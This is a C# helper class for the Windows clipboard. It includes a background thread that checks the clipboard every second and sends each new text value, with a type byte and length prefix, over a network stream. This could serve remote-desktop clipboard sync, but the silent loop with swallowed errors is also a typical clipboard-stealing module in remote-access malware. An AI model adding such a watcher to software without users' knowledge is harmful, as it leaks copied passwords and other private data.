using System;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

public static class ClipboardHelper
{
    const byte CLIPBOARD_TEXT = 0x04;

    public static void SetText(string text)
    {
        Thread thread = new Thread(() =>
        {
            try { Clipboard.SetText(text); } catch { }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
    }

    public static string GetText()
    {
        string result = "";
        Thread thread = new Thread(() =>
        {
            try { result = Clipboard.ContainsText() ? Clipboard.GetText() : ""; } catch { }
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
        return result;
    }

    public static void StartClipboardWatcher(NetworkStream stream)
    {
        string lastClipboard = "";

        new Thread(() =>
        {
            while (true)
            {
                try
                {
                    string current = ClipboardHelper.GetText();
                    if (current != lastClipboard)
                    {
                        lastClipboard = current;

                        byte[] textBytes = System.Text.Encoding.UTF8.GetBytes(current);
                        byte[] msg = new byte[1 + 4 + textBytes.Length];
                        msg[0] = CLIPBOARD_TEXT;
                        Buffer.BlockCopy(BitConverter.GetBytes(textBytes.Length), 0, msg, 1, 4);
                        Buffer.BlockCopy(textBytes, 0, msg, 5, textBytes.Length);

                        stream.Write(msg, 0, msg.Length);
                    }

                    Thread.Sleep(1000); 
                }
                catch {  }
            }
        })
        { IsBackground = true }.Start();
    }

}
